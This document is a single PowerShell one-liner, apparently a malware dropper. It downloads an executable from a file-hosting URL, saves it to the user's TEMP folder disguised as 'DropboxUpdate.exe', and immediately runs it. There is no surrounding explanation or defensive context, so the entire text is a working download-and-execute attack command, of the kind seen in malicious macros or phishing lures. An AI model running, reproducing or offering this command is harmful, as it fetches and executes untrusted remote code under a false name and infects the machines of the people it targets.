
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',"$env:TEMP\DropboxUpdate.exe");Start-Process ("$env:TEMP\DropboxUpdate.exe")

